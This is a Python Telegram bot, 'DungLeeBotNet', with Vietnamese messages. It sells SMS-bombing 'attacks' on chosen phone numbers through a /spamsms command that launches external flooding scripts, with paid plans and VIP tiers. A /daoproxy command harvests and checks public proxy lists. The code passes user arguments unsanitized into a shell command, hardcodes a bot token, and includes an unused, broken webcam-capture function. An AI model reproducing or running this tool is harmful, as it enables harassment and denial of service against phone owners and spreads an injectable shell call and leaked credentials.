import socket
import requests
import asyncio
import subprocess
import socket
from urllib.parse import urlparse
from urllib.parse import urlparse
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, CallbackContext
import threading
import os
import subprocess
import socket
from urllib.parse import urlparse
print("Logged As DungLeee")
import subprocess
import os
import sys
import time
from datetime import datetime
import datetime
import time
from time import sleep,strftime
from datetime import datetime
import requests as r, os, threading, random
now = datetime.now()
anhgiap = now.strftime("%d")
dt_string = now.strftime("%H:%M:%S")
ngay = now.strftime("%d")
thang = now.strftime("%m")
nam = now.strftime("%Y")
running = -1
SLOT_MAX = 1000
SLOT_USAGE = [None] * SLOT_MAX
TOKEN = '7346577373:AAHudwvRWSS5is9XuzFB-vKGzfnE7LWJSUQ'

tips = [
      "Ngày Em Đi,Anh Cầm Tool Ra Dí Số Cô Chủ Nhiệm",
      "Anh Không Phải Hacker Nhưng Có Thể Cho Sim Máy Em Biến Mất",
      "Ngày Em Biết Nhớ Thương Một Người Là Ngày Tôi Biết Sắp Xa Em Rồi",
      "Không Tử Tế Thì Đừng Mong Tình Cảm Của Em?",
      "Hạnh Phúc Đôi Ta Cũng Phải Trải Qua Vô Vàn Sóng Gió",
      "Đôi Lúc Em Tránh Ánh Mắt Của Anh, Vì Dường Như Lúc Nào Em Cũng Hiểu Thấu Lòng Anh",
      "Đôi Khi Là Một Chuyến Xe, Là Nơi Chúng Ta Hướng Đến",
      "Dù Ngày Mai Thế Giới Có Đổi Thay, Tình Em Anh Xin Mãi Giữ Trong Tim",
      "Người Ơi Có Còn Nhớ, Nhớ Đến Nơi Ta Hẹn Hò?",
      "Ngày Xưa Mỗi Khi Hoàng Hôn, Mình Lại Cùng Ra Nơi Đây Quấn Quýt Bên Nhau",
      "Có Lẽ Em Cần Thêm Thời Gian?",
      "Nhìn Thấy Em Khóc, Lòng Anh Co Thắt Xót Xa",
      "Tôi Từng Đập Vỡ Tấm Gương Cho Dù Nó Còn Nguyên Vẹn",
      "Tôi Từng Để Đất Cát Chôn Vùi Ước Mơ Khát Vọng Của Bản Thân",
      "Em Ước Gì Anh Thấy Em Khóc, Vì Em Cố Chấp Theo Đuổi Tình Yêu Ấy",
      "Câu Trả Lời Chắc Em Biết Được, Sao Hỏi Anh Làm Chi Em Ơi",
      "Anh Vẫn Là Anh Như Ngày Nào, Yêu Một Người Đâu Dễ Quên Vậy Đâu",
      "Anh Sẵn Sàng Chấp Nhận Mọi Lỗi Lầm Của Em",
      "Vẫn Câu Nói Anh Giờ Ra Sao,Vẫn Câu Nói Giờ Anh Thế Nào",
      "Anh Vẫn Còn Yêu Em Phải Không?",
      "Em Vẫn Còn Yêu Anh Phải Không?",
      "Tình Yêu Đâu Phải Những Giấc Mộng Mà Ta Vẫn Mong Khi Đêm Về",
      "Đánh Mất Em Có Phải Là Một Cái Giá Quá Đắt?",
      "Đại Dương Mông Mênh Ơi Hỡi Em Ở Đâu?",
      "I Need Your Love Tonight",
      "Ngã Tư Đường Mình Gặp Lại Nhau",
      "Anh Cầu Nguyện Cho Ngày Mai Nắng Lên Rồi Em Sẽ Quay Về",
      "Dù Tình Ta Giờ Đã Trái Ngang Nhưng Anh Vẫn Không Thể Quên Được Em",
      "Cũng May Đường Về Nhà Em Quá Xa, Tôi Mới Được Trông Ngóng Em Buông Lời Hát",
      "Đợi Chờ Em Như Chờ Ánh Nắng Lên, Chờ Cho Lại Nghe Tiếng Con Tim Thổn Thức"
]

async def clear(update: Update, context: CallbackContext) -> None:    
    await update.message.reply_text("Command /clear was invoked!")

urls = [
    "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&proxy_format=protocolipport&format=text",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
    "https://api.proxyscrape.com/?request=getproxies&proxytype=https&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt",
    "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/saisuiu/Lionkings-Http-Proxys-Proxies/main/cnfree.txt",
    "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt",
    "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/https_proxies.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/https/https.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4",
    "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",
    "https://api.openproxylist.xyz/socks4.txt",
    "https://proxyspace.pro/socks4.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/socks4.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
    "https://proxyspace.pro/socks4.txt",
    "https://www.proxy-list.download/api/v1/get?type=socks4",
    "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks4.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
    "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
    "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies_anonymous/socks4.txt",
    "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/socks4.txt",
    "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks4.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks4.txt",
    "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt",
    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks4.txt",
    "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks4.txt",
    "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
    "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
    "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks5.txt",
    "https://api.openproxylist.xyz/socks5.txt",
    "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5",
    "https://proxyspace.pro/socks5.txt",
    "https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/socks5.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies_anonymous/socks5.txt",
    "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/socks5.txt",
    "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks5.txt",
    "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt",
    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks5.txt",
    "https://spys.me/socks.txt",
    "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks5.txt"

]

def get_ip_info(ip):
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json")
        response.raise_for_status()
        data = response.json()
        isp = data.get('org', 'Không có thông tin ISP')
        org = data.get('org', 'Không có thông tin ORG')
        asn = data.get('asn', 'Không có thông tin ASN')
        country = data.get('country', 'Không có thông tin Quốc Gia')
        return isp, org, asn, country
    except requests.RequestException as e:
        print(f"Lỗi khi lấy thông tin IP: {str(e)}")
        return 'Không có thông tin ISP', 'Không có thông tin ORG', 'Không có thông tin ASN', 'Không có thông tin Quốc Gia'


def check_proxy(proxy, live_proxies, die_proxies):
    try:
        proxies = {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}",
        }
        response = requests.get("http://www.google.com", proxies=proxies, timeout=5)
        if response.status_code == 200:
            live_proxies.append(proxy)
        else:
            die_proxies.append(proxy)
    except:
        die_proxies.append(proxy)

async def admin(update: Update, context: CallbackContext) -> None:
    await update.message.reply_text('Owner/Script Builder • Phù Văn Đức • Trương Hàm Thuận • DungLee \nBot Được Tạo Ngày 30/8/2024 \nLần Cuối Cập Nhật 20/9/2024 \nPhiên Bản • 1.5.1')
async def start(update: Update, context: CallbackContext) -> None:
    await update.message.reply_text('Xin chào, Chào Mừng Đến Với DungLeeBotNet')
async def help(update: Update, context: CallbackContext) -> None:
    await update.message.reply_text("""
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  ⚜ Welcome To Help Page Of Bot ⚜
┃️•  /setplan  - Set Plan For Users
┃•  /setvip   - Set Vip For Users
┃•  /help     - Display This Page
┃•  /spamsms  - Start SpamSMS Attacks
┃•  /daoproxy - Dig Useful Big-Proxys
┃•  /lookup   - Lookup An IP
┃•  /clear    - Clear Chat Screen
┃•  /admin    - Display Admin Credit
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
def get_vip_list():
    vip_list = set()
    try:
        with open('vip.txt', 'r') as file:
            for line in file:
                vip_list.add(line.strip().lower())  # Chuyển username sang chữ thường để so sánh không phân biệt chữ hoa/thường
    except FileNotFoundError:
        print("File vip.txt Not Found")
    return vip_list

def get_plan_list():
    plan_list = {}
    try:
        with open('plan.txt', 'r') as file:
            for line in file:
                user_name, plan = line.strip().split(':')
                plan_list[user_name.lower()] = plan  # Chuyển username sang chữ thường để so sánh không phân biệt chữ hoa/thường
    except FileNotFoundError:
        print("File plan.txt Not Found")
    return plan_list






# Hàm để chụp ảnh từ camera
def capture_image(filename):
    # Mở camera (0 là camera mặc định, có thể thay đổi nếu có nhiều camera)
    cap = cv2.VideoCapture(0)
    
    if not cap.isOpened():
        raise Exception("Không thể mở camera")
    
    # Chờ camera ổn định
    cv2.waitKey(1000)
    
    # Chụp ảnh
    ret, frame = cap.read()
    if not ret:
        raise Exception("Không thể chụp ảnh")
    
    # Lưu ảnh vào file
    cv2.imwrite(filename, frame)
    
    # Giải phóng camera
    cap.release()

async def ongoing(update: Update, context: CallbackContext) -> None:
    ongoing_attacks = [usage for usage in SLOT_USAGE if usage is not None]
    if ongoing_attacks:
        await update.message.reply_text(f""" {'#':<1}        {'Phone':<1}        {'Count':<1}    """)
        await update.message.reply_text(f"""--- ----------------- -------""")
        for usage in ongoing_attacks:
            phone, count, running = usage
            await update.message.reply_text(f""" {running:<3} {phone:<17} {count:<6}""")

    else:
            await update.message.reply_text(f"""There are currently no ongoing attacks.""")

async def spamsms(update: Update, context: CallbackContext) -> None:
    global running
    vip_list = get_vip_list()
    plan_list = get_plan_list()
    user_name = update.message.from_user.username
    user_id = update.message.from_user.id  # Lấy ID của người dùng
    if not user_name:
        await update.message.reply_text('Please Set Username To Use Bot')
        return
    user_name = user_name.lower()
    vip_status = "True" if user_name in vip_list else "False"
    user_plan = plan_list.get(user_name, "Free")

    try:
        phone = context.args[0]
        count = context.args[1]
        method = context.args[2]

        if method.upper() == "SMS-DRILL":
            command = f"python decc.py {phone} {count}"
        elif method.upper() == "SMS-ROCKET":
            command = f"python 911.py {phone} {count}"
        elif method.upper() == "SMS-DROP":
            command = f"python dec.py {phone} {count}"
        elif method.upper() == "SMS-STRESSER":
            command = f"python decccc.py {phone} {count}"
        else:
            await update.message.reply_text(f"Phương thức không hỗ trợ: {method}")
            return

        print(f"Running command: {command}")  # Debug: In lệnh để kiểm tra

        async def run_command():
            try:
                process = await asyncio.create_subprocess_shell(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout, stderr = await process.communicate()  # Chờ lệnh hoàn tất

                if process.returncode == 0:
                    await update.message.reply_text("Attack started successfully!")
                else:
                    await update.message.reply_text(f"")
            except Exception as e:
                print(f"std")

        # Bắt đầu chạy lệnh mà không chờ hoàn tất
        running += 1
        asyncio.create_task(run_command())
        await update.message.reply_text(f"""
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ 💮 Attack Successfully Sent 💮
┃ PHONE     • [{phone}]
┃ COUNT     • [{count}]
┃ METHOD  • [{method}]
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ SENT BY   • [{user_name}]
┃ SENT IN    • [{ngay}/{thang}/{nam}]
┃ ONGOING • [{running}]
┃ EXPIRY      • [Mar/10/2025]
┃ STAMP      • [{dt_string}]
┃ PLAN         • [{user_plan}]
┃ POWERED • [TreTrauAPI]
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""") 
    except IndexError:
        await update.message.reply_text('Hướng Dẫn Sử Dụng Trước Khi Dùng!!!')
        await update.message.reply_text('Usage : /spamsms <phone> <count> <method> \n Methods : 🚀 SMS-DRILL 🚀\n                    🚀 SMS-ROCKET 🚀\n                    🚀 SMS-DROP 🚀\n                    🚀 SMS-STRESSER 🚀\n                    🚀 SMS-RATE 🚀 [UNDER MAINTENANCE]\n                    🚀 SMS-EXPECT 🚀 [UNDER MAINTENANCE]\n                    🚀 SMS-NET 🚀 [UNDER MAINTENANCE]\n                    🚀 SMS-BOT 🚀 [UNDER MAINTENANCE]\n                    🚀 SMS-PROXY 🚀 [UNDER MAINTENANCE]\n Tips : TreTrauSpamSMS On Top🤣')
    except Exception as e:
        await update.message.reply_text(f'Error')


async def daoproxy(update: Update, context: CallbackContext) -> None:
    keyboard = [
        [
            InlineKeyboardButton("Tiếp tục", callback_data='continue'),
            InlineKeyboardButton("Dừng lại", callback_data='stop'),
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text('Khi Đào Tất Cả Nội Dung Trong File proxy.txt Sẽ Bị Xoá Bạn Có Muốn Tiếp Tục?', reply_markup=reply_markup)

async def button(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    await query.answer()

    if query.data == 'continue':    
        if os.path.exists("proxy.txt"):
            with open("proxy.txt", "w") as file:
                file.write("")

        await query.edit_message_text(text="Đang tiến hành đào proxy...")

        proxy_list = []

        for url in urls:
            response = requests.get(url)
            if response.status_code == 200:
                proxy_list.extend(response.text.splitlines())

        live_proxies = []
        die_proxies = []
        threads = []

        for proxy in proxy_list:
            t = threading.Thread(target=check_proxy, args=(proxy, live_proxies, die_proxies))
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        with open("proxy.txt", "w") as file:
            for proxy in live_proxies:
                file.write(proxy + "\n")
        live_count = len(live_proxies)
        die_count = len(die_proxies)
        await query.message.reply_text(f'{live_count} proxy live đã được lưu vào file proxy.txt')
        await query.message.reply_text(f'{die_count} proxy die')        
        with open("proxy.txt", "rb") as file:
            await context.bot.send_document(chat_id=query.message.chat_id, document=file)

    elif query.data == 'stop':
        await query.edit_message_text(text="Quá trình đã bị hủy bỏ.")

async def setplan(update: Update, context: CallbackContext) -> None:
    user_name = update.message.from_user.username
    
    if not user_name:
        await update.message.reply_text('Please set a username to use this bot.')
        return
    
    user_name = user_name.lower()  
    
    plan_list = get_plan_list()
    user_plan = plan_list.get(user_name, "Free")
    
   
    if user_plan != "admin":
        await update.message.reply_text('Bạn không có quyền thực hiện lệnh này')
        return
    
    
    if len(context.args) != 2:
        await update.message.reply_text('HDSD: /setplan <username> <plan>')
        return

    target_user = context.args[0].lower()
    new_plan = context.args[1].lower()

    
    plan_list[target_user] = new_plan
    with open('plan.txt', 'w') as file:
        for user, plan in plan_list.items():
            file.write(f'{user}:{plan}\n')

    await update.message.reply_text(f'Plan của {target_user} đã được cập nhật thành {new_plan}.')

async def setvip(update: Update, context: CallbackContext) -> None:
    user_name = update.message.from_user.username
    
    if not user_name:
        await update.message.reply_text('Please set a username to use this bot.')
        return
    
    user_name = user_name.lower() 
    
    plan_list = get_plan_list()
    user_plan = plan_list.get(user_name, "Free")    
    if user_plan != "admin":
        await update.message.reply_text('Bạn không có quyền thực hiện lệnh này.')
        return        
    if len(context.args) != 1:
        await update.message.reply_text('HDSD: /setvip <username>')
        return
    target_user = context.args[0].lower()
    vip_list = get_vip_list()
    vip_list.add(target_user)
    with open('vip.txt', 'w') as file:
        for user in vip_list:
            file.write(f'{user}\n')

    await update.message.reply_text(f'{target_user} đã được thêm vào danh sách VIP.')

def main() -> None:
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("spamsms", spamsms))
    application.add_handler(CommandHandler("admin", admin))
    application.add_handler(CommandHandler("clear", clear))
    application.add_handler(CommandHandler("help", help))
    application.add_handler(CommandHandler("daoproxy", daoproxy))
    application.add_handler(CommandHandler("setplan", setplan))
    application.add_handler(CommandHandler("setvip", setvip))
    application.add_handler(CallbackQueryHandler(button))

    application.run_polling()

if __name__ == '__main__':
    main()